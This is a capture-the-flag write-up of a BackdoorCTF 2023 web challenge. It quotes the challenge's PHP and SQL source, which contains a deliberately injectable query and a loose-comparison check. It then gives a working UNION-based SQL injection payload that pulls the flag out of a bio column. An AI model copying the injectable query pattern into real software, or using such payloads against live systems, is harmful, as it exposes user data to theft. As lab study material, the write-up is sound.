# too-many-admins

### Category: Web

###### author: p1r4t3 - [ 239 solves / 314 pts ]

Too many admins spoil the broth. Can you login as the right admin and get the flag ?

`http://34.132.132.69:8000/`

Attachments:

- [public.zip](/BackdoorCTF%202023/Web/public.zip)

## Solution: (unintended?)

The web has an input form with 2 field, username and password. The objective is to login as the right admin and get the flag.

![](/media/bd23-2manyadm.png)

First, we check the `dump.sql` and `index.php` file from the provided zip.

### 📄 dump.sql

Inside the sql file, we can see a procedure like this

```sql
-- Insert 500 random values into the 'users' table
DELIMITER //
CREATE PROCEDURE GenerateRandomUsers()
BEGIN
    DECLARE i INT DEFAULT 0;
    WHILE i < 500 DO
        IF i = {SOME_NUMBER} THEN
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                'REDACTED',
                'Flag{REDACTED}'
            );
        ELSE
            INSERT INTO users (username, password, bio)
            VALUES (
                CONCAT('admin', i),
                MD5(CONCAT('admin',i,RAND())),
                CONCAT('Bio for admin', i)
            );
        END IF;
        SET i = i + 1;
    END WHILE;
END //
DELIMITER ;
```

What it does, basically, is store the flag on n-th admin's bio and generate random hashed-password for the rest.

### 📄 index.php

Next, this is the code for the input form:

```php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if (empty($username) || empty($password)) {
        echo "Please fill in both fields.";
    } else {
        $query = "SELECT username, password, bio FROM users WHERE username = '$username' ";
        $result = $conn->query($query);
        $mysupersecurehash = md5(2*2*13*13*((int)$password));
        $i =0 ;
        while ($row = mysqli_fetch_row($result)) {
            if((int)$row[1] == $mysupersecurehash && $mysupersecurehash == 0e0776470569150041331763470558650263116470594705){
                echo "<h1>You win</h1> \n";
                echo "Did you really? \n";
                echo "<tr><td>" .$i. " </td><td> "  . $row[0] . " </td><td> " . $row[1] . " </td><td> " . $row[2] . " </td></tr>";
                $i++;
            }else{
                echo "<h1>Wrong password</h1>";
            }
        }
    }
}
```

What it does:

- get the value of `$username` and `$password` from the form through POST Http-method
- check whether the value is empty or not.
- if not, then it retrieve `username`, `password`, and `bio` data from database where username is `$username`
- multiply the value of `$password` by 2\*2\*13\*13, hash the result, and store it in `$mysupersecurehash`
- then, loop through every row of the data and check 2 conditions: 1) if the password field is equal to `$mysupersecurehash`; and 2) if the value of `$mysupersecurehash` is `0e0776470569150041331763470558650263116470594705`
- if both conditions are true, then show the data row, including the bio field which store the flag

Looking at the code above, I figured that it has something to do with hash collision due to PHP loose comparison/type juggling vulnerability. So in order to get the flag, you need to figure out the correct admin username and bypass the loose comparison.

But wait a minute. I think we found another vulnerability.

Check this code below

```php
// Fetch the 'user' parameter from the query string
$userParam = $_GET['user'];

// Use prepared statement to prevent SQL injection
if($userParam){
    if($userParam !=  "all"){
        $query = "SELECT username, password, bio FROM users where username = '$userParam' ";
    } else {
        $query = "SELECT username, password, bio FROM users ";
    }
    $result = $conn->query($query);

    // Display the result in a table
    echo "<table border='1'>";
    echo "<tr><th>S.no</th><th>Username</th><th>Password(MD5 hashes)</th></tr>";

    // Fetch and display the data
    $i = 0;
    while ($row = mysqli_fetch_row($result)) {
        echo "<tr><td>".$i."</td><td>" . $row[0] . "</td><td>" . $row[1] . "</td></tr>";
        $i++;
    }

    echo "</table>";
}
```

Turns out that there's another usage of Http-method GET with `user` parameter.

- if `user` is "all", then get all the data from database
- other than that, it will use query with WHERE clause.

> _Cool! We can just get the flag right away by dumping all data using `?user=all` parameter, right?_

Nope. Because it will just show the first 2 field, username and password while the flag is in the 3rd field, bio.

So we need to use the 2nd query that has SQLI vulnerability.

- use UNION operator to combine two SELECT statements
- the 2nd statements is used to get the bio field from users table
- (optional) use LIKE operator so you can get the flag right away

This is the parameter/query that I use:

`?user=' union select username,bio,3 from users where bio like 'Flag%' --+-`

![](/media/bd23-2manyadm-2.png)

## FLAG

<details>
  <summary></summary>
  
flag{1m40_php_15_84d_47_d1ff323n71471n9_7yp35}

_ps. as you can see from the flag, this challenge most likely has something to do with the type juggling vulnerability so what I did here is an unintended solution_ 😬✌️

</details>

🏷️tags: SQLI
